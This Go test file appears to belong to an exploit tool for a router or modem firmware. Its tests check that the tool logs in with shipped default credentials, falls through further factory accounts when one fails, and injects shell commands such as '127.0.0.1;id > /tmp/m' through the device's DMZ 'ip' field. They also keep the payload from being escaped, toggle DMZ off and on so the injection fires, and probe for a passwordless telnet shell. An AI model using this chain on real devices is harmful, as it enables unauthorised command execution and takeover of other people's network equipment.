package zlt

import (
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

// The point of this test file: prove that the DMZ injection is reachable with
// the *ordinary* web account, and that the device's reported privilege tier is
// carried through the flow without ever gating it.
//
// Ground truth from the firmware (see docs/protocol.md "Privilege model"):
// http.c authenticate() switches on cmd and only ever answers "session valid"
// or NO_AUTH. It never compares account_level. So admin/admin (level 3) must be
// accepted for cmd=172 subcmd=6.

func TestShippedCredentialsStartsWithOrdinaryUser(t *testing.T) {
	creds := ShippedCredentials()
	if len(creds) == 0 {
		t.Fatal("no shipped credentials")
	}
	first := creds[0]
	if first.User != DefaultUser || first.Pass != DefaultPass {
		t.Fatalf("first credential must be the ordinary web user %q/%q, got %q/%q",
			DefaultUser, DefaultPass, first.User, first.Pass)
	}
	// The super account may appear, but never first: it is not a prerequisite.
	for i, c := range creds {
		if c.User == superUserName && i == 0 {
			t.Fatal("super account must not be the primary credential")
		}
	}
}

func TestCredentialStringRedactsPassword(t *testing.T) {
	c := Credential{User: "admin", Pass: "hunter2hunter2"}
	got := c.String()
	if strings.Contains(got, "hunter2hunter2") {
		t.Fatalf("String() leaked the password: %q", got)
	}
	if !strings.HasPrefix(got, "admin/h") {
		t.Fatalf("unexpected format: %q", got)
	}
}

func TestLevelIsSuper(t *testing.T) {
	if !LevelIsSuper("1") {
		t.Fatal(`"1" is the top tier`)
	}
	for _, l := range []string{"2", "3", "", "0"} {
		if LevelIsSuper(l) {
			t.Fatalf("%q must not be considered super", l)
		}
	}
}

// chainDevice serves the two-step login handshake plus the DMZ handler, and
// reports whatever level the test asks for.
func chainDevice(t *testing.T, accept map[string]string, level string) *httptest.Server {
	t.Helper()
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		var body map[string]any
		_ = json.NewDecoder(r.Body).Decode(&body)
		cmd, _ := body["cmd"].(float64)
		switch int(cmd) {
		case CmdGetNextLoginTime:
			_, _ = w.Write([]byte(`{"token":"tok"}`))
		case CmdLogin:
			user, _ := body["username"].(string)
			want, ok := accept[user]
			hashed, _ := body["passwd"].(string)
			if !ok || hashed != HashPassword("tok", want) {
				_, _ = w.Write([]byte(`{"success":"fail","login_fail":"fail","message":"passwd error"}`))
				return
			}
			_, _ = w.Write([]byte(`{"success":"success","AUTH":"AUTH","sessionId":"sid","user_level":"` + level + `"}`))
		case CmdNetworkService:
			// Only a session gets you here - mirror the device.
			if sid, _ := body["sessionId"].(string); sid == "" || sid != "sid" {
				_, _ = w.Write([]byte(`{"success":false,"cmd":172,"message":"NO_AUTH"}`))
				return
			}
			_, _ = w.Write([]byte(`{"success":true,"cmd":172,"message":""}`))
		default:
			_, _ = w.Write([]byte(`{}`))
		}
	}))
	t.Cleanup(srv.Close)
	return srv
}

// The headline assertion: level 3 (ordinary admin) + cmd 172 => accepted.
func TestUnlockSucceedsWithOrdinaryUserAtLevel3(t *testing.T) {
	srv := chainDevice(t, map[string]string{"admin": "admin"}, "3")
	cl, err := NewClient(srv.URL, "en", 5e9, true)
	if err != nil {
		t.Fatal(err)
	}
	orch := &UnlockOrchestrator{
		Client: cl,
		Host:   "127.0.0.1",
		Opts: UnlockOptions{
			Username:     "admin",
			Password:     "admin",
			DMZHost:      "127.0.0.1",
			Mode:         ShellModeCallback,
			Command:      "id",
			ProbeTimeout: 1,
		},
	}
	res, err := orch.Run()
	if err != nil {
		t.Fatalf("unlock with admin/admin failed: %v", err)
	}
	if !res.LoggedIn {
		t.Fatal("expected to be logged in")
	}
	if res.Level != "3" {
		t.Fatalf("level = %q, want 3", res.Level)
	}
	if !strings.Contains(res.RawReply, `"success":true`) {
		t.Fatalf("handler did not accept the injection: %q", res.RawReply)
	}
	// It must not have refused on privilege grounds.
	for _, n := range res.Notes {
		if strings.Contains(n, "not super") && strings.Contains(n, "refus") {
			t.Fatalf("flow gated on privilege tier: %q", n)
		}
	}
}

// When the admin password has been changed, the chain must fall through to the
// next shipped account instead of failing outright.
func TestLoginChainFallsBackThroughShippedAccounts(t *testing.T) {
	creds := ShippedCredentials()
	if len(creds) < 2 {
		t.Skip("no fallback credentials configured")
	}
	second := creds[1]
	srv := chainDevice(t, map[string]string{second.User: second.Pass}, "2")
	cl, err := NewClient(srv.URL, "en", 5e9, true)
	if err != nil {
		t.Fatal(err)
	}
	best, attempts, err := cl.LoginChain(creds)
	if err != nil {
		t.Fatalf("chain failed: %v", err)
	}
	if !best.OK || best.User != second.User {
		t.Fatalf("expected %q to win, got %+v", second.User, best)
	}
	if len(attempts) != 2 {
		t.Fatalf("expected 2 attempts, got %d", len(attempts))
	}
	if attempts[0].OK {
		t.Fatal("first credential should have been rejected")
	}
}

// The device's JSON reader strips a backslash but does not decode \uXXXX, so
// HTML-escaping a payload turns ">" into the literal text "u003e" and the shell
// redirect silently disappears while the device still answers success:true.
func TestMarshalBodyDoesNotEscapeHTML(t *testing.T) {
	got, err := MarshalBody(map[string]any{"ip": "127.0.0.1;id > /tmp/m 2>&1 && echo ok"})
	if err != nil {
		t.Fatal(err)
	}
	for _, bad := range []string{`\u003e`, `\u003c`, `\u0026`} {
		if strings.Contains(string(got), bad) {
			t.Fatalf("body HTML-escaped (%s present): %s", bad, got)
		}
	}
	if !strings.Contains(string(got), "> /tmp/m 2>&1 && echo ok") {
		t.Fatalf("payload mangled: %s", got)
	}
}

// payloadSent builds a client against a recorder and returns the raw bodies.
func payloadSent(t *testing.T, body map[string]any) []string {
	t.Helper()
	var bodies []string
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		buf := make([]byte, 4096)
		n, _ := io.ReadFull(r.Body, buf)
		if n > 0 {
			bodies = append(bodies, string(buf[:n]))
		}
		_, _ = w.Write([]byte(`{"success":true,"cmd":172,"message":""}`))
	}))
	defer srv.Close()
	cl, err := NewClient(srv.URL, "en", 5e9, true)
	if err != nil {
		t.Fatal(err)
	}
	cl.SessionID = "sid"
	o := UnlockOrchestrator{Client: cl, Opts: UnlockOptions{DMZHost: "127.0.0.1", Mode: ShellModeCallback, Command: "id"}}
	if _, err := o.performInject(body); err != nil {
		t.Fatalf("performInject: %v", err)
	}
	return bodies
}

// The DMZ apply is asynchronous and deduped, so every attempt must force an
// enabled 0 -> 1 transition rather than just rewriting the ip.
func TestPerformInjectTogglesEnabledFirst(t *testing.T) {
	bodies := payloadSent(t, map[string]any{"cmd": 172, "subcmd": 6, "enabled": "1", "ip": "127.0.0.1;id"})
	if len(bodies) != 2 {
		t.Fatalf("expected a disable then an enable, got %d requests", len(bodies))
	}
	if !strings.Contains(bodies[0], `"enabled":"0"`) {
		t.Fatalf("first request should disable DMZ: %s", bodies[0])
	}
	if !strings.Contains(bodies[1], `"enabled":"1"`) {
		t.Fatalf("second request should enable DMZ: %s", bodies[1])
	}
	if !strings.Contains(bodies[1], "127.0.0.1;id") {
		t.Fatalf("second request lost the payload: %s", bodies[1])
	}
}

// An SSH server greets you before authenticating; that is not a free shell.
func TestProbeIgnoresSSHBanner(t *testing.T) {
	if looksUnauthenticated("SSH-2.0-dropbear_2020.80\r\n") {
		t.Fatal("an SSH banner must not be reported as a passwordless shell")
	}
	if !IsSSH("SSH-2.0-dropbear_2020.80\r\n") {
		t.Fatal("IsSSH should recognise a dropbear banner")
	}
	if !looksUnauthenticated("\xff\xfd\x01\xff\xfd\x1f\xff\xfb\x01\xff\xfb\x03") {
		t.Fatal("telnet IAC-only banner is the expected no-auth shape")
	}
}
